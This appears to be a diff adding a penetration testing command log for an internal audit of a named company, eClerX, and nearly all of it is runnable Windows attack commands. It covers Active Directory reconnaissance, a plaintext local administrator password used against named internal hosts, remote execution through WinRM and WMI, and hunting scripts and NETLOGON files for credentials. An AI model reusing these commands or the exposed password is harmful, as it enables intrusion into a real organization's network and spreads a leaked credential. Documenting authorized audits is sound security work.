@@ -1,0 +1,76 @@
+================================================================================
+PENETRATION TESTING COMMAND LOG: eClerX INTERNAL AUDIT
+================================================================================
+
+--- 1. RECONNAISSANCE & ASSET DISCOVERY ---
+
+# Find up to 10 computers in the domain with OS details
+Get-NetComputer -FullData | Select-Object dnshostname, operatingsystem -First 10
+
+# List computers while excluding Domain Controllers (targeting workstations/servers)
+Get-NetComputer | Where-Object {$_ -notlike "*OU=Domain Controllers*"} | Select-Object -First 20
+
+# Search Group Policy Objects (GPOs) for specific strings (e.g., "eclerxadmin")
+Get-NetGPO | %{Get-GPOReport -Guid $_.Name -ReportType Xml} | Select-String "eclerxadmin"
+
+# Identify the Organizational Unit (OU) linked to a specific GPO GUID
+Get-NetOU -GUID "{83D0A789-8F1B-4652-8CD3-AA5CCFFC8CF7}" | Select-Object DistinguishedName
+
+
+--- 2. CREDENTIAL MANAGEMENT & VALIDATION ---
+
+# Create a secure credential object for "eclerxadmin"
+$password = ConvertTo-SecureString "Eclerx@1234" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential (".\eclerxadmin", $password)
+
+# Map a remote administrative share (C$) to a local drive letter (Z:)
+New-PSDrive -Name Z -PSProvider FileSystem -Root "\\pdlfsprnciti\C$" -Credential $cred
+
+# Test credentials via legacy CMD (often bypasses PowerShell-specific errors)
+net use T: \\pdlfsprnciti\C$ /user:eclerxadmin Eclerx@1234
+
+
+--- 3. PIVOTING & REMOTE EXECUTION ---
+
+# Enter an interactive remote PowerShell session (WinRM)
+Enter-PSSession -ComputerName ARLMVDC01.india.eclerx.com -Credential $cred
+
+# Execute a command remotely to check permissions/identity
+Invoke-Command -ComputerName pdlfsprnciti -Credential $cred -ScriptBlock { whoami /all }
+
+# Use WMI to create a process on a remote machine (Stealthier/Alternative to WinRM)
+$target = "pdlfsprnciti"
+$process = [wmiclass]"\\$target\root\cimv2:Win32_Process"
+$process.Create("powershell.exe -Command 'whoami > C:\pwn.txt'", $null, $null)
+
+
+--- 4. FILE HUNTING & DATA EXFILTRATION ---
+
+# Search for hidden files across the entire C: drive
+Get-ChildItem -Path C:\ -Attributes Hidden -Recurse -ErrorAction SilentlyContinue
+
+# CMD-based search for hidden files in subdirectories
+dir /ah /s
+
+# Search for sensitive keywords inside .vbs or .bat scripts
+Select-String -Path "*.vbs" -Pattern "password", "user", "connect"
+
+# Read content of a remote logon script in NETLOGON
+Get-Content "\\ECXCIAZDC01.india.eclerx.com\NETLOGON\Pune_CITI_Printer.vbs"
+
+
+--- 5. TROUBLESHOOTING GUIDE ---
+
+# ERROR 5 (Access Denied): 
+# Credentials are correct, but the account isn't in the Local Admins group.
+# Solution: Check GPO Linkage to find where the account is actually assigned.
+
+# ERROR 1326 (Logon Failure): 
+# Username or Password incorrect. 
+# Solution: Use ".\eclerxadmin" to ensure you aren't using the Domain prefix for a local account.
+
+# "Parameter Not Found" (-Credential): 
+# Some commands (like 'ls') don't support the -Credential flag. 
+# Solution: Use New-PSDrive or Invoke-Command instead.
+
+================================================================================
